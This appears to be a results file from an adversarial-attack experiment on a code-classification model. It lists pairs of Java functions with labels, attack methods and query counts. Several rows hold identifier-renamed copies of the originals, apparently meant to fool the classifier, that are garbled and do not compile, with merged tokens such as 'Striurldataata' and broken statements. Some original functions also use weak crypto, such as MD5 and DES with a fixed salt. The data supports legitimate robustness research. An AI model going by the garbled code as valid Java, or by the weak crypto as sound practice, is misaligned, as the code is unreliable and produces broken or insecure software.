                while (role_perm_ir.hasNext()) {
                    RolePermission rolePerm = (RolePermission) role_perm_ir.next();
                    pstmt.setString(1, String.valueOf(rolePerm.getRoleid()));
                    pstmt.setString(2, String.valueOf(rolePerm.getResourceid()));
                    pstmt.setString(3, String.valueOf(rolePerm.getResopid()));
                    pstmt.executeUpdate();
                }
                conn.commit();
                conn.setAutoCommit(true);
            }
        } catch (Exception e) {
            conn.rollback();
            throw new DAOException();
        } finally {
            try {
                if (conn != null) {
                    conn.close();
                }
                if (pstmt != null) {
                    pstmt.close();
                }
            } catch (Exception e) {
            }
        }
    }
",563,,LABEL_1,LABEL_0,,-4,"doOne,bid,tid,aid,delta,aBalance,RS,Stmt,Query,res",,,,0,,0,Greedy,1,0.0008223334948221843,,[]
145,"    private String encode(String plaintext) {
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA"");
            md.update(plaintext.getBytes(""UTF-8""));
            byte raw[] = md.digest();
            return (new BASE64Encoder()).encode(raw);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(""Error encoding: "" + e);
        } catch (UnsupportedEncodingException e) {
            throw new IllegalStateException(""Error encoding: "" + e);
        }
    }
 <SPLIT>     static Cipher createCipher(String passwd, int mode) throws Exception {
        PBEKeySpec keySpec = new PBEKeySpec(passwd.toCharArray());
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(""PBEWithMD5AndDES"");
        SecretKey key = keyFactory.generateSecret(keySpec);
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(""input"".getBytes());
        byte[] digest = md.digest();
        byte[] salt = new byte[8];
        for (int i = 0; i < 8; ++i) salt[i] = digest[i];
        PBEParameterSpec paramSpec = new PBEParameterSpec(salt, 20);
        Cipher cipher = Cipher.getInstance(""PBEWithMD5AndDES"");
        cipher.init(mode, key, paramSpec);
        return cipher;
    }
",99,,LABEL_1,LABEL_1,LABEL_1,-1,"encode,plaintext,md,raw",,,,0,,0,GA,1517,0.5380239367485047,failed,[]
146,"    public static String getUniqueKey() {
        String digest = """";
        try {
            final MessageDigest md = MessageDigest.getInstance(""MD5"");
            final String timeVal = """" + (System.currentTimeMillis() + 1);
            String localHost = """";
            try {
                localHost = InetAddress.getLocalHost().toString();
            } catch (UnknownHostException e) {
                println(""Warn: getUniqueKey(), Error trying to get localhost"" + e.getMessage());
            }
            final String randVal = """" + new Random().nextInt();
            final String val = timeVal + localHost + randVal;
            md.reset();
            md.update(val.getBytes());
            digest = toHexString(md.digest());
        } catch (NoSuchAlgorithmException e) {
            println(""Warn: getUniqueKey() "" + e);
        }
        return digest;
    }
 <SPLIT>     public static void copy(File source, File destination) throws FileNotFoundException, IOException {
        if (source == null) throw new NullPointerException(""The source may not be null."");
        if (destination == null) throw new NullPointerException(""The destination may not be null."");
        FileInputStream sourceStream = new FileInputStream(source);
        destination.getParentFile().mkdirs();
        FileOutputStream destStream = new FileOutputStream(destination);
        try {
            FileChannel sourceChannel = sourceStream.getChannel();
            FileChannel destChannel = destStream.getChannel();
            destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
        } finally {
            try {
                sourceStream.close();
                destStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
",162,,LABEL_0,LABEL_0,LABEL_0,-1,"getUniqueKey,digest,md,timeVal,localHost,randVal,val",,,,0,,0,GA,2427,0.8730844418207805,failed,[]
147,"    private static long copy(InputStream source, OutputStream sink) {
        try {
            return IOUtils.copyLarge(source, sink);
        } catch (IOException e) {
            logger.error(e.toString(), e);
            throw new FaultException(""System error copying stream"", e);
        } finally {
            IOUtils.closeQuietly(source);
            IOUtils.closeQuietly(sink);
        }
    }
 <SPLIT>     public Object execute(ExecutionEvent event) throws ExecutionException {
        try {
            Shell shell = PlatformUI.getWorkbench().getActiveWorkbenchWindow().getShell();
            QuizTreeView view = (QuizTreeView) PlatformUI.getWorkbench().getActiveWorkbenchWindow().getActivePage().showView(""org.rcpquizengine.views.quizzes"");
            Folder rootFolder = view.getRootFolder();
            if (rootFolder.isEncrypted()) {
                PasswordDialog dialog = new PasswordDialog(shell);
                if (dialog.open() == Window.OK) {
                    String password = dialog.getPassword();
                    if (!password.equals("""")) {
                        String md5 = """";
                        MessageDigest md = MessageDigest.getInstance(""MD5"");
                        md.update(password.getBytes());
                        md5 = new BigInteger(md.digest()).toString();
                        if (rootFolder.getMd5Digest().equals(md5)) {
                            rootFolder.setMd5Digest("""");
                            rootFolder.setEncrypted(false);
                            MessageDialog.openInformation(shell, ""Quiz bank unlocked"", ""The current quiz bank has been unlocked"");
                        } else {
                            MessageDialog.openError(shell, ""Error unlocking quiz bank"", ""Incorrect password"");
                        }
                        password = """";
                        md5 = """";
                    }
                }
            } else {
                MessageDialog.openError(shell, ""Error unlocking quiz bank"", ""Quiz bank already unlocked"");
            }
        } catch (PartInitException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return null;
    }
",75,,LABEL_0,LABEL_0,LABEL_0,-1,"copy,source,sink",,,,0,,0,GA,1163,0.41816697518030804,failed,[]
148,"    public synchronized InputStream getResourceAsStream(String name) {
        InputStream inputStream = null;
        BufferedInputStream in = null;
        BufferedOutputStream out = null;
        try {
            URL url = getResource(name);
            String remoteName = url.toExternalForm();
            String localName = (String) cacheHashtable.get(remoteName);
            if (localName != null) {
                System.out.println(""Retrieving \"""" + localName + ""\""..."");
                return new FileInputStream(localName);
            }
            String host = url.getHost();
            String prot = url.getProtocol();
            int port = url.getPort();
            File cacheFile = new File(cacheDir, prot + File.separator + host + File.separator + ""port"" + (port == -1 ? """" : Integer.toString(port)) + File.separator + name);
            cacheFile = new File(cacheFile.getCanonicalPath());
            localName = cacheFile.getCanonicalPath();
            System.out.println(""Comparing \"""" + localName + ""\""..."");
            URLConnection urlConnection = url.openConnection();
            if (cacheFile.exists()) {
                urlConnection.setIfModifiedSince(cacheFile.lastModified());
            }
            if (urlConnection instanceof HttpURLConnection) {
                HttpURLConnection httpURLConnection = (HttpURLConnection) urlConnection;
                httpURLConnection.setFollowRedirects(true);
                httpURLConnection.setRequestMethod(""GET"");
                int responseCode = httpURLConnection.getResponseCode();
                System.out.println(httpURLConnection.getResponseMessage() + "", "" + httpURLConnection.getContentLength() + "" bytes"" + "", "" + new Date(httpURLConnection.getDate()) + "", "" + new Date(httpURLConnection.getLastModified()));
                if (responseCode != HttpURLConnection.HTTP_OK) {
                    return null;
                }
            }
            inputStream = urlConnection.getInputStream();
            if (inputStream == null) return null;
            if (cacheFile.exists()) {
                long lastModified = urlConnection.getLastModified();
                if ((lastModified > 0) && (lastModified < cacheFile.lastModified())) {
                    inputStream.close();
                    cacheHashtable.put(remoteName, localName);
                    System.out.println(""Retrieving \"""" + localName + ""\""..."");
                    return new FileInputStream(cacheFile);
                }
            }
            File parentFile = new File(cacheFile.getParent());
            parentFile.mkdirs();
            localName = cacheFile.getCanonicalPath();
            System.out.println(""CACHING \"""" + localName + ""\""..."");
            in = new BufferedInputStream(inputStream);
            out = new BufferedOutputStream(new FileOutputStream(cacheFile));
            int i;
            while ((i = in.read()) > -1) out.write(i);
            out.close();
            in.close();
            cacheHashtable.put(remoteName, localName);
            System.out.println(""Retrieving \"""" + localName + ""\""..."");
            return new FileInputStream(localName);
        } catch (Exception ex) {
            try {
                inputStream.close();
            } catch (Exception ex1) {
            }
            try {
                in.close();
            } catch (Exception ex1) {
            }
            try {
                out.close();
            } catch (Exception ex1) {
            }
            ex.printStackTrace();
            return null;
        }
    }
 <SPLIT>     public static boolean copyTextFile(File src, File dst) {
        try {
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(src));
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(dst));
            byte[] buf = new byte[1024];
            int readsize = 0;
            while ((readsize = bis.read(buf)) != -1) {
                bos.write(buf, 0, readsize);
            }
            bos.flush();
            bos.close();
            bis.close();
        } catch (IOException e) {
            ServerConsoleServlet.printSystemLog(e.toString() + "" "" + e.getMessage(), ServerConsoleServlet.LOG_ERROR);
            return false;
        }
        return true;
    }
",645,,LABEL_1,LABEL_0,,-4,"getResourceAsStream,name,inputStream,in,out,url,remoteName,localName,host,prot,port,cacheFile,urlConnection,httpURLConnection,responseCode,lastModified",,,,0,,0,Greedy,1,0.0007966041564941406,,[]
149,"    private void download(String fileName) {
        String filePath = Activator.showSaveDialog(fileName, new String[] { "".xls"" });
        if (filePath != null) {
            InputStream in = null;
            OutputStream out = null;
            try {
                in = this.getClass().getResourceAsStream(""/"" + fileName);
                out = new FileOutputStream(filePath);
                IOUtils.copy(in, out);
            } catch (IOException ioe) {
                Activator.showExceptionDialog(ioe);
            } finally {
                if (in != null) {
                    try {
                        in.close();
                    } catch (IOException e1) {
                        Activator.showExceptionDialog(e1);
                    }
                }
                if (out != null) {
                    try {
                        out.close();
                    } catch (IOException e1) {
                        Activator.showExceptionDialog(e1);
                    }
                }
            }
        }
    }
 <SPLIT>     public void patch() throws IOException {
        if (mods.isEmpty()) {
            return;
        }
        IOUtils.copy(new FileInputStream(Paths.getMinecraftJarPath()), new FileOutputStream(new File(Paths.getMinecraftBackupPath())));
        JarFile mcjar = new JarFile(Paths.getMinecraftJarPath());
    }
",164,,LABEL_1,LABEL_1,LABEL_1,-1,"download,fileName,filePath,in,out",,,,0,,0,GA,1385,0.49794325431187947,failed,[]
150,"    public static long getFileSize(String address) {
        URL url = null;
        try {
            url = new URL(address);
            System.err.println(""Indirizzo valido - "" + url.toString().substring(0, 10) + ""..."");
        } catch (MalformedURLException ex) {
            System.err.println(""Indirizzo non valido!"");
        }
        try {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty(""Range"", ""bytes=0-"");
            connection.connect();
            return connection.getContentLength();
        } catch (IOException ioe) {
            System.err.println(""I/O error!"");
            return 0;
        }
    }
 <SPLIT>     public static InputStream getConfigIs(String path, String name) throws ProgrammerException, DesignerException, UserException {
        InputStream is = null;
        try {
            URL url = getConfigResource(new MonadUri(path).append(name));
            if (url != null) {
                is = url.openStream();
            }
        } catch (IOException e) {
            throw new ProgrammerException(e);
        }
        return is;
    }
",135,,LABEL_0,LABEL_0,LABEL_0,-1,"getFileSize,address,url,connection",,,,0,,0,GA,1226,0.4377098242441813,failed,[]
151,"    protected void doSetInput(IEditorInput input, IProgressMonitor monitor) throws CoreException {
        IWorkspaceRoot root = ResourcesPlugin.getWorkspace().getRoot();
        IFileFormat format = null;
        Object source = null;
        InputStream in = null;
        try {
            IPath path;
            if (input instanceof IStorageEditorInput) {
                IStorage s = ((IStorageEditorInput) input).getStorage();
                in = s.getContents();
                if (s instanceof IFile) {
                    IFile file = (IFile) s;
                    path = file.getRawLocation();
                    if (root.exists(path)) {
                        path = root.getLocation().append(path);
                    }
                    source = path.toFile();
                }
            } else if (input instanceof IPathEditorInput) {
                path = ((IPathEditorInput) input).getPath();
                source = path.toFile();
            } else if (input instanceof IURIEditorInput) {
                URI uri = ((IURIEditorInput) input).getURI();
                if (URIUtil.isFileURI(uri)) {
                    source = URIUtil.toFile(uri);
                } else {
                    URL url = URIUtil.toURL(uri);
                    in = url.openStream();
                }
            }
            if (source == null) {
                if (!in.markSupported()) {
                    in = new BufferedInputStream(in);
                }
                in.mark(10);
                source = in;
            }
            IContentDescription cd = Platform.getContentTypeManager().getDescriptionFor(in, input.getName(), new QualifiedName[] { ImageCore.VALID_FORMATS });
            if (in != null) {
                in.reset();
            }
            Collection<?> valid = (Collection<?>) cd.getProperty(ImageCore.VALID_FORMATS);
            if (valid.isEmpty()) throw new CoreException(new Status(Status.ERROR, ImageUI.PLUGIN_ID, ""Unsupported file format.""));
            ImageInputStream stream = ImageIO.createImageInputStream(source);
            format = (IFileFormat) valid.iterator().next();
            IDocument document = format.decode(stream, monitor);
            setDocument(document);
        } catch (IOException e) {
            Status status = new Status(Status.ERROR, ImageUI.PLUGIN_ID, ""IO Error"", e);
            throw new CoreException(status);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                }
            }
        }
        super.setInput(input);
    }
 <SPLIT>     public String readURL(String urlLocation, ArrayList headers, RenderEngine c) throws Exception {
        URL url = null;
        HttpURLConnection conn = null;
        InputStream istream = null;
        try {
            url = new URL(urlLocation);
            conn = (HttpURLConnection) url.openConnection();
        } catch (Exception e) {
            throw new Exception(""Soap is unable to retrieve URL for '"" + urlLocation + ""': "" + e.getMessage());
        }
        loadCookies(urlLocation, conn, c);
        if (headers != null) {
            for (int i = 0; i < headers.size(); i++) {
                String header = (String) headers.get(i);
                String key = header.substring(0, header.indexOf("":""));
                String value = header.substring(header.indexOf("":"") + 2);
                Debug.log(""Adding new request header '"" + key + ""'='"" + value + ""'"");
                conn.setRequestProperty(key, value);
            }
        }
        Debug.debug(""Set to use GET, URL="" + urlLocation);
        try {
            istream = conn.getInputStream();
        } catch (Exception e) {
            Debug.debug(""Unable to capture input stream: "" + e.getMessage());
            throw new Exception(""Unable to capture input stream from URL '"" + urlLocation + ""': "" + e.getMessage());
        }
        Debug.debug(""'GET' - Got input stream."");
        if (conn.getContentLength() == -1) {
            Debug.debug(""Content length = unknown"");
        } else {
            Debug.debug(""Content length = "" + conn.getContentLength());
        }
        byte data[] = null;
        int curPos = 0, contentLength = conn.getContentLength();
        if (conn.getContentLength() == -1) {
            String byteSize = NodeUtil.walkNodeTree(Server.getConfig(), ""//configuration/object[@type='engine.tunable']/property[@type='engine.unknowncontentsize']/@value"");
            if (byteSize == null) {
                contentLength = 4096;
            } else {
                contentLength = Integer.parseInt(byteSize);
            }
            Debug.debug(""Content length unknown.  Allowing fuzz of "" + contentLength + "" bytes."");
        }
        data = new byte[contentLength];
        try {
            int dataRead = 0;
            while ((dataRead = istream.read(data, curPos, contentLength - curPos)) != -1) {
                if (dataRead == 0) {
                    break;
                }
                curPos += dataRead;
            }
        } catch (Exception e) {
            throw new Exception(""Soap is unable to read data from HTTP connection: "" + e.getMessage());
        }
        try {
            istream.close();
            conn.disconnect();
        } catch (MalformedURLException e) {
            throw new Exception(""Soap request to site '"" + urlLocation + ""' is invalid: "" + e.getMessage());
        } catch (IOException e) {
            throw new Exception(""Soap request to site '"" + urlLocation + ""' failed to connect."");
        }
        String dataOut = new String(data);
        int counter = 0;
        data = null;
        istream = null;
        conn = null;
        url = null;
        return dataOut.trim();
    }
",472,,LABEL_0,LABEL_0,LABEL_0,-1,"doSetInput,input,monitor,root,format,source,in,path,s,file,uri,url,cd,valid,stream,document",,,,0,,0,GA,5883,2.370037114620209,failed,[]
152,"    public static byte[] getJarEntry(String jarName, String entry, int port) {
        byte[] b = null;
        try {
            String codebase = System.getProperty(""java.rmi.server.codebase"", InetAddress.getLocalHost().getHostName());
            String protocol = ""http://"";
            int x = codebase.indexOf(protocol) + protocol.length();
            String s2 = codebase.substring(x);
            int x2 = s2.indexOf('/');
            String downloadHost = s2.substring(0, x2);
            if (downloadHost.indexOf(':') == -1) {
                downloadHost += "":"" + port;
            }
            URL url = new URL(""jar:http://"" + downloadHost + ""/"" + jarName + ""!/"" + entry);
            JarURLConnection jurl = (JarURLConnection) url.openConnection();
            JarEntry je = jurl.getJarEntry();
            InputStream is = jurl.getInputStream();
            BufferedInputStream bis = new BufferedInputStream(is);
            int size = (int) je.getSize();
            b = new byte[size];
            int rb = 0;
            int chunk = 0;
            while ((size - rb) > 0) {
                chunk = bis.read(b, rb, size - rb);
                if (chunk == -1) {
                    break;
                }
                rb += chunk;
            }
            bis.close();
            is.close();
            bis = null;
            is = null;
            url = null;
            jurl = null;
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return null;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return b;
    }
 <SPLIT>     public void getHttpURL() throws Exception {
        boolean display = true;
        boolean allHeaders = false;
        String url = null;
        url = ""http://localhost/cubigraf2"";
        url = ""http://www.accenture.com/NR/rdonlyres/971C4EEE-24E2-4BAA-8C7B-D5A5133D5968/0/en_sprout.jpg"";
        url = ""http://www.uni.pt/img/home-direito.gif"";
        url = ""http://www.google.com"";
        URLConnection uc = new URL(url).openConnection();
        println(""HEADERS:"");
        if (allHeaders) {
            Iterator<Map.Entry<String, List<String>>> itHeaders = uc.getHeaderFields().entrySet().iterator();
            while (itHeaders.hasNext()) {
                Map.Entry<String, List<String>> e = itHeaders.next();
                Iterator<?> itValues = e.getValue().iterator();
                while (itValues.hasNext()) {
                    println(e.getKey() + "": "" + itValues.next());
                }
            }
        } else {
            showObjectProperty(uc, ""getContentEncoding"");
            showObjectProperty(uc, ""getContentLength"");
            showObjectProperty(uc, ""getContentType"");
            showObjectProperty(uc, ""getDate"", FORMAT.TIMESTAMP);
            showObjectProperty(uc, ""getExpiration"", FORMAT.TIMESTAMP);
            showObjectProperty(uc, ""getLastModified"", FORMAT.TIMESTAMP);
        }
        ExtendedInputStream in = new ExtendedInputStream(uc.getInputStream(), url.toString());
        if (display) {
            println(""BODY:"");
            ExtendedReader reader = new ExtendedReader(in);
            for (String s = reader.readLine(); s != null; s = reader.readLine()) {
                println(s);
            }
        } else {
            println(""(BODY saved to a file)"");
            String contentType = uc.getContentType();
            StringBuilder filename = new StringBuilder(""C:\\Documents and Settings\\Carlos_da_S_Pereira\\Desktop\\JAVA_NET_TESTS"");
            filename.append(""."");
            filename.append(contentType.substring(contentType.indexOf(""/"") + 1));
            File file = new File(filename.toString());
            ExtendedOutputStream out = new ExtendedOutputStream(new FileOutputStream(file), file.getAbsolutePath());
            Streams.copy(in, out);
            out.close();
        }
        in.close();
    }
",327,"    public static byte[] getJarFile(String javaName, String ry, int target) {
        byte[] bb = null;
        try {
            String codeBase = System.getProperty(""java.rmi.server.codebase"", InetAddress.getLocalHost().getHostName());
            String Protost = ""http://"";
            inexp x = codeBase.indexOf(Protost) + Protost.length();
            String s2string1 codeBase.substring(exp);
            int x2 = x52ring1.indexOf('/');
            String downlotransferPorting1.substring(0, x52);
            if (transferPort.indexOf(':') == -1) {
                dotransferPort= "":"" + target;
            }
            URbbrl = new URL(""jar:http://"" transferPortst + ""/"" + javaName + ""!/"" + ry);
            JarURLConnectiongURLl = (JarURLConnection) bb.openConnection();
            JarEntrykeee =gURLl.getJarFile();
            InputStream isin = gURL.getInputStream();
            BufferedInputStream bils new BufferedInputStream(isin);
            int sform= (int) kee.getSize();
            bb = new byte[form];
            int sb = 0;
            int  chack = 0;
            while ((form - sb) > 0) {
                 chack = blsread(bb, sb, form - sb);
                if ( chack == -1) {
                    break;
                }
                sb +=  chack;
            }
            ls.close();
            isin.close();
            ls = null;
            isin = null;
            bb = null;
            gURL = null;
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return null;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return bb;
    }
",LABEL_0,LABEL_0,0.57512366771698,1,"getJarEntry,jarName,entry,port,b,codebase,protocol,x,s2,x2,downloadHost,url,jurl,je,is,bis,size,rb,chunk",,,,0,"getJarEntry:getJarFile,jarName:javaName,entry:ry,port:target,b:bb,codebase:codeBase,protocol:Protost,x:exp,s2:string1,x2:x52,downloadHost:transferPort,url:bb,jurl:gURL,je:kee,is:isin,bis:ls,size:form,rb:sb,chunk: chack,",0,GA,4239,1.63783411582311,ga,[]
153,"    public String[][] getProjectTreeData() {
        String[][] treeData = null;
        String filename = dms_home + FS + ""temp"" + FS + username + ""adminprojects.xml"";
        String urlString = dms_url + ""/servlet/com.ufnasoft.dms.server.ServerGetAdminProjects"";
        try {
            String urldata = urlString + ""?username="" + URLEncoder.encode(username, ""UTF-8"") + ""&key="" + URLEncoder.encode(key, ""UTF-8"") + ""&filename="" + URLEncoder.encode(username, ""UTF-8"") + ""adminprojects.xml"";
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            factory.setValidating(false);
            DocumentBuilder parser = factory.newDocumentBuilder();
            URL u = new URL(urldata);
            DataInputStream is = new DataInputStream(u.openStream());
            FileOutputStream os = new FileOutputStream(filename);
            int iBufSize = is.available();
            byte inBuf[] = new byte[20000 * 1024];
            int iNumRead;
            while ((iNumRead = is.read(inBuf, 0, iBufSize)) > 0) os.write(inBuf, 0, iNumRead);
            os.close();
            is.close();
            File f = new File(filename);
            InputStream inputstream = new FileInputStream(f);
            Document document = parser.parse(inputstream);
            NodeList nodelist = document.getElementsByTagName(""proj"");
            int num = nodelist.getLength();
            treeData = new String[num][3];
            for (int i = 0; i < num; i++) {
                treeData[i][0] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""pid""));
                treeData[i][1] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""ppid""));
                treeData[i][2] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""p""));
            }
        } catch (MalformedURLException ex) {
            System.out.println(ex);
        } catch (ParserConfigurationException ex) {
            System.out.println(ex);
        } catch (NullPointerException e) {
        } catch (Exception ex) {
            System.out.println(ex);
        }
        return treeData;
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",456,"    public String[][] getProjecttreeInfo() {
        String[][] treeData = null;
        String filename = dms_home + FS + ""temp"" + FS + username + ""adminprojects.xml"";
        String urlURL = dms_url + ""/servlet/com.ufnasoft.dms.server.ServerGetAdminProjects"";
        try {
            Striurldataata = urlURL + ""?username="" + URLEncoder.encode(username, ""UTF-8"") + ""&key="" + URLEncoder.encode(key, ""UTF-8"") + ""&filename="" + URLEncoder.encode(username, ""UTF-8"") + ""adminprojects.xml"";
            DocumentBuilderFactory luild = DocumentBuilderFactory.newInstance();
            luild.setValidating(false);
            DocumentBuildeparserer = luild.newDocumentBuilder();
            URL b = new URL(urldata);
            DataInputStream is = new DataInputStream(b.openStream());
            FileOutputStream fits = new FileOutputStream(filename);
            int iBuffSt = is.available();
            byte  inCbuf[] = new byte[20000 * 1024];
            int inumWrite;
            while ((iNumRinumWrite.read(i inCbuf 0, iBiBuffSt > 0) fits.write( inCbuf, 0, inumWrite);
            fits.close();
            is.close();
            File f = new File(filename);
            InputStream inputsw = new FileInputStream(f);
            Documdocumentment = parser.parse(inputsw);
            NodeList nodelist = document.getElementsByTagName(""proj"");
            int num = nodelist.getLength();
            treeData = new String[num][3];
            for (int i = 0; i < num; i++) {
                treeData[i][0] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""pid""));
                treeData[i][1] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""ppid""));
                treeData[i][2] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""p""));
            }
        } catch (MalformedURLException ex) {
            System.out.println(ex);
        } catch (ParserConfigurationException ex) {
            System.out.println(ex);
        } catch (NullPointerException e) {
        } catch (Exception ex) {
            System.out.println(ex);
        }
        return treeData;
    }
",LABEL_1,LABEL_1,0.6320788860321045,1,"getProjectTreeData,treeData,filename,urlString,urldata,factory,parser,u,is,os,iBufSize,inBuf,iNumRead,f,inputstream,document,nodelist,num,i",,,,38,"getProjectTreeData:getProjecttreeInfo,treeData:treeData,filename:filename,urlString:urlURL,urldata:urldata,factory:luild,parser:parser,u:b,is:is,os:fits,iBufSize:iBuffSt,inBuf: inCbuf,iNumRead:inumWrite,f:f,inputstream:inputsw,document:document,nodelist:nodelist,num:num,i:i,",10,GA,1013,0.4137417674064636,ga,[]
154,"    public void create() {
        Connection conn = OrmHandler.getInstance().getSession().getConnection(this);
        Statement stat = null;
        StringBuilder sql = new StringBuilder(256);
        try {
            getRenderer().printCreateDatabase(this, sql);
            conn = createConnection();
            stat = conn.createStatement();
            stat.executeUpdate(sql.toString());
            conn.commit();
            if (LOGGER.isLoggable(Level.INFO)) {
                LOGGER.info(sql.toString());
            }
        } catch (Throwable e) {
            if (conn != null) {
                try {
                    conn.rollback();
                } catch (SQLException ex) {
                    LOGGER.log(Level.WARNING, ""Can't rollback DB"" + toString(), ex);
                }
            }
            throw new IllegalArgumentException(""Statement error:\n"" + sql, e);
        } finally {
            try {
                close(conn, stat, null, true);
            } catch (IllegalStateException ex) {
                LOGGER.log(Level.WARNING, ""Can't rollback DB"" + toString(), ex);
            }
        }
    }
 <SPLIT>     public int create(BusinessObject o) throws DAOException {
        int insert = 0;
        int id = 0;
        Item item = (Item) o;
        try {
            PreparedStatement pst = connection.prepareStatement(XMLGetQuery.getQuery(""INSERT_ITEM""));
            pst.setString(1, item.getDescription());
            pst.setDouble(2, item.getUnit_price());
            pst.setInt(3, item.getQuantity());
            pst.setDouble(4, item.getVat());
            pst.setInt(5, item.getIdProject());
            pst.setInt(6, item.getIdCurrency());
            insert = pst.executeUpdate();
            if (insert <= 0) {
                connection.rollback();
                throw new DAOException(""Number of rows <= 0"");
            } else if (insert > 1) {
                connection.rollback();
                throw new DAOException(""Number of rows > 1"");
            }
            Statement st = connection.createStatement();
            ResultSet rs = st.executeQuery(""select max(id_item) from item"");
            rs.next();
            id = rs.getInt(1);
            connection.commit();
        } catch (SQLException e) {
            Log.write(e.getMessage());
            throw new DAOException(""A SQLException has occured"");
        } catch (NullPointerException npe) {
            Log.write(npe.getMessage());
            throw new DAOException(""Connection null"");
        }
        return id;
    }
",215,"    public void database() {
        Connection Connection = OrmHandler.getInstance().getSession().getConnection(this);
        Statement serv = null;
        StringBuilder url = new StringBuilder(256);
        try {
            getRenderer().printCreateDatabase(this, url);
            Connection = createConnection();
            stat =servnection.createStatement();
            serv.executeUpdate(url.toString());
            Connection.commit();
            if (LOGGER.isLoggable(Level.INFO)) {
                LOGGER.info(url.toString());
            }
        } catch (Throwable e) {
            if (Connection != null) {
                try {
                    Connection.rollback();
                } catch (SQLException ex) {
                    LOGGER.log(Level.WARNING, ""Can't rollback DB"" + toString(), ex);
                }
            }
            throw new IllegalArgumentException(""Statement error:
"" + url, e);
        } finally {
            try {
                close(Connection, serv, null, true);
            } catch (IllegalStateException ex) {
                LOGGER.log(Level.WARNING, ""Can't rollback DB"" + toString(), ex);
            }
        }
    }
",LABEL_1,LABEL_1,0.5074469447135925,1,"create,conn,stat,sql",,,,0,"create:database,conn:Connection,stat:serv,sql:url,",0,GA,637,0.2333552320798238,ga,[]
155,"    static void copyFile(File in, File out) throws IOException {
        FileChannel source = new FileInputStream(in).getChannel();
        FileChannel destination = new FileOutputStream(out).getChannel();
        source.transferTo(0, source.size(), destination);
        source.close();
        destination.close();
    }
 <SPLIT>     public String md5(String plainText) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(plainText.getBytes());
        byte[] digest = md.digest();
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < digest.length; i++) {
            plainText = Integer.toHexString(0xFF & digest[i]);
            if (plainText.length() < 2) {
                plainText = ""0"" + plainText;
            }
            hexString.append(plainText);
        }
        return hexString.toString();
    }
